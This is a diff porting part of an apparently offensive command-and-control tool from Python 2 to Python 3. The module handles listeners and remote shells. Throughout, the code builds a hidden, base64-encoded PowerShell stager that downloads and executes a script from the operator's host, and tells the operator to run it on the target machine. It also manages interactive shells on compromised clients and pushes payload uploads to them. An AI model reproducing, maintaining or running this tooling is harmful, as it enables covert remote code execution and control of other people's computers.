@@ -1,4 +1,4 @@
-from __future__ import unicode_literals
+
 from main import *
 from menu import *
 from prompt_toolkit.contrib.completers import WordCompleter
@@ -11,10 +11,10 @@ def killAllClients():
     numberofclientskilled = 0
     from menu import clientMenuOptions
     if len(clientMenuOptions) > 2:
-        suretoquit = raw_input('You have clients connected. Are you sure you want to exit? [y]/n: ')
+        suretoquit = input('You have clients connected. Are you sure you want to exit? [y]/n: ')
         if suretoquit.lower() == 'y' or suretoquit.lower() == '':
             for server in serverlist:
-                for clientnumber in server.handlers.keys():
+                for clientnumber in list(server.handlers.keys()):
                     numberofclientskilled += 1
                     server.handlers[clientnumber].handle_close()
             return True
@@ -49,11 +49,11 @@ def printListener(printit=True, returnit=False):
     stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
 
     if printit:
-        print t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n'
+        print(t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n')
 
     if bindOrReverse == 'b':
         if not '5556' in str(serverlist):
-            ipADDR = raw_input('[?] IP Address of target (after executing stager): ')
+            ipADDR = input('[?] IP Address of target (after executing stager): ')
             connectserver = Server(ipADDR, 5556, bindsocket=False)
             serverlist.append(connectserver)
 
@@ -71,12 +71,12 @@ def interactShell(clientnumber):
     clientnumber = int(clientnumber)
     from menu import clientMenuOptions
     for server in serverlist:
-        if clientnumber in server.handlers.keys():
-            print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
+        if clientnumber in list(server.handlers.keys()):
+            print("Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50)
             while True:
                 try:
                     if server.handlers[clientnumber].in_buffer:
-                        print server.handlers[clientnumber].in_buffer.pop()
+                        print(server.handlers[clientnumber].in_buffer.pop())
                     command = prompt_toolkit.prompt("PS >", completer=WordCompleter(['back', 'exit']), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), history=history)
                     if command.lower() == "back":
                         break
@@ -92,7 +92,7 @@ def interactShell(clientnumber):
                         server.handlers[clientnumber].out_buffer.append(json)
                         while not server.handlers[clientnumber].in_buffer:
                             time.sleep(0.01)
-                        print server.handlers[clientnumber].in_buffer.pop()
+                        print(server.handlers[clientnumber].in_buffer.pop())
                 except KeyboardInterrupt:
                     break
 
@@ -129,16 +129,16 @@ def checkPayloadLength(payload):
 def checkUpload():
     from menu import clientMenuOptions
     use_client_upload = prompt_toolkit.prompt('\n[?] Upload Using Client Connection? [y]/n: ', patch_stdout=True, completer=WordCompleter(['y', 'n']))
-    print
+    print()
     if use_client_upload.lower() == 'y' or use_client_upload == '':
         clientList = []
-        for i in clientMenuOptions.keys():
+        for i in list(clientMenuOptions.keys()):
             if i == 'back' or i == 'r':
                 pass
             else:
                 clientList.append(i)
-                print t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.bold_yellow + ' | ' + t.bold_green + clientMenuOptions[i]['availablemodules'].keys()[0] + t.bold_yellow + ' | ' + t.bold_green + clientMenuOptions[i]['availablemodules'].keys()[1] + t.normal
-        print
+                print(t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.bold_yellow + ' | ' + t.bold_green + list(clientMenuOptions[i]['availablemodules'].keys())[0] + t.bold_yellow + ' | ' + t.bold_green + list(clientMenuOptions[i]['availablemodules'].keys())[1] + t.normal)
+        print()
         while True:
             clientchoice = prompt_toolkit.prompt('Client > ', patch_stdout=True, style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), completer=WordCompleter(clientList))
             try:
@@ -172,16 +172,16 @@ def clientUpload(powershellExec, isExe, json):
         if splitPayoad:
             for p in splitPayoad:
                 for server in serverlist:
-                    if clientnumber in server.handlers.keys():
+                    if clientnumber in list(server.handlers.keys()):
                         server.handlers[clientnumber].out_buffer.append(json % (p))
                         time.sleep(0.5)
             time.sleep(0.5)
             for server in serverlist:
-                if clientnumber in server.handlers.keys():
+                if clientnumber in list(server.handlers.keys()):
                     server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":"false", "multiple":"exec"}')
         else:
             for server in serverlist:
-                if clientnumber in server.handlers.keys():
+                if clientnumber in list(server.handlers.keys()):
                     server.handlers[clientnumber].out_buffer.append(json % (b64Exec))
 
         return clientnumber
